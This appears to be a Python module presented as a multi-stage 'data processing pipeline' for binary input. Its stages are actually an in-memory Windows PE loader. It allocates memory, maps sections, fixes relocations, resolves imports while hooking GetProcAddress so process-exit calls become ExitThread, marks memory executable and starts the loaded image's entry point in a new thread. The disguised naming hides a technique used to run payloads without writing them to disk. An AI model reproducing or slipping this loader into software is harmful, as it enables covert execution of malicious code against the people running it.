# -*- coding: utf-8 -*-
"""
Data processing pipeline — multi-stage analyzer for structured binary input.
"""
import ctypes
import time

_handlers = {}

_ORDER = (
    "check_format", "reserve_space", "organize_blocks",
    "adjust_positions", "link_references", "set_permissions", "activate",
)


def register(name):
    def _dec(fn):
        _handlers[name] = fn
        return fn
    return _dec


def _v(ctx, k):
    return ctx.get(k)


def _s(ctx, k, v):
    ctx[k] = v


@register("check_format")
def _h1(ctx):
    import os, struct
    d = _v(ctx, "d")
    if not d or len(d) < 64:
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        return False
    from . import env, cipher
    k = env.query_system()
    if not k:
        return False
    info = cipher.parse_header(d)
    if not info:
        return False
    _s(ctx, "k", k)
    _s(ctx, "info", info)
    return True


@register("reserve_space")
def _h2(ctx):
    k = _v(ctx, "k")
    info = _v(ctx, "info")
    sz = info["s"]
    pref = info["b"]
    b = k.VirtualAlloc(ctypes.c_void_p(pref), sz, 0x3000, 0x04)
    if not b or b != pref:
        b = k.VirtualAlloc(None, sz, 0x3000, 0x04)
        _s(ctx, "fix", True)
    if not b:
        return False
    _s(ctx, "b", b)
    return True


@register("organize_blocks")
def _h3(ctx):
    d = _v(ctx, "d")
    b = _v(ctx, "b")
    info = _v(ctx, "info")
    hsz = info["h"]
    ctypes.memmove(b, d[:hsz], hsz)
    for vs, va, rs, rp, ch in info["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(d) - rp)
            if n > 0:
                ctypes.memmove(b + va, d[rp:rp + n], n)
    return True


@register("adjust_positions")
def _h4(ctx):
    if not _v(ctx, "fix"):
        return True
    from . import cipher
    k = _v(ctx, "k")
    info = _v(ctx, "info")
    b = _v(ctx, "b")
    delta = b - info["b"]
    rr = info["r"]
    rz = info["z"]
    if not rr or not rz:
        k.VirtualFree(ctypes.c_void_p(b), 0, 0x8000)
        return False
    pos = 0
    while pos < rz:
        br = cipher.read_value(b + rr + pos, "<I")
        bs = cipher.read_value(b + rr + pos + 4, "<I")
        if bs == 0:
            break
        for j in range((bs - 8) // 2):
            ent = cipher.read_value(b + rr + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = b + br + (ent & 0xFFF)
                cipher.write_value(a, "<Q", cipher.read_value(a, "<Q") + delta)
        pos += bs
    return True


_ta = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess")


@register("link_references")
def _h5(ctx):
    info = _v(ctx, "info")
    if not info["i"]:
        return True
    from . import cipher
    k = _v(ctx, "k")
    b = _v(ctx, "b")
    _k32 = k.GetModuleHandleA(b"kernel32.dll")
    et = k.GetProcAddress(_k32, b"ExitThread")
    _gpa_raw = k.GetProcAddress(_k32, b"GetProcAddress")
    _GT = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
    _rg = _GT(_gpa_raw)

    @_GT
    def _hook(hm, no):
        nv = no if no is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _ta:
                    return et
            except Exception:
                pass
        return _rg(hm, nv)

    ctx["_gr"] = _hook
    _hp = ctypes.cast(_hook, ctypes.c_void_p).value
    off = b + info["i"]
    while True:
        nr = cipher.read_value(off + 12, "<I")
        if nr == 0:
            break
        ir = cipher.read_value(off, "<I")
        ar = cipher.read_value(off + 16, "<I")
        dn = ctypes.string_at(b + nr)
        hm = k.LoadLibraryA(dn)
        lk = b + (ir if ir else ar)
        ia = b + ar
        while hm:
            tv = cipher.read_value(lk, "<Q")
            if tv == 0:
                break
            if tv & 0x8000000000000000:
                fa = k.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(b + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _ta and et:
                    fa = et
                elif fn == b"GetProcAddress" and _hp:
                    fa = _hp
                else:
                    fa = k.GetProcAddress(hm, fn)
            if fa:
                cipher.write_value(ia, "<Q", fa)
            lk += 8
            ia += 8
        off += 20
    return True


@register("set_permissions")
def _h6(ctx):
    k = _v(ctx, "k")
    info = _v(ctx, "info")
    b = _v(ctx, "b")
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in info["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        hx = bool(ch & 0x20000000)
        hw = bool(ch & 0x80000000)
        pt = (0x40 if hw else 0x20) if hx else (0x04 if hw else 0x02)
        k.VirtualProtect(ctypes.c_void_p(b + va), sz, pt, ctypes.byref(old))
    return True


@register("activate")
def _h7(ctx):
    k = _v(ctx, "k")
    info = _v(ctx, "info")
    b = _v(ctx, "b")
    tid = ctypes.c_ulong(0)
    ht = k.CreateThread(None, 0, ctypes.c_void_p(b + info["e"]), None, 0, ctypes.byref(tid))
    if not ht:
        return False
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if k.WaitForSingleObject(ht, 2000) == 0:
            break
    k.CloseHandle(ht)
    return True


def process_data(data):
    ctx = {"d": data, "b": None, "info": None, "k": None, "fix": False}
    try:
        for name in _ORDER:
            h = _handlers.get(name)
            if h and h(ctx) is False:
                return False
        return True
    except Exception:
        return False
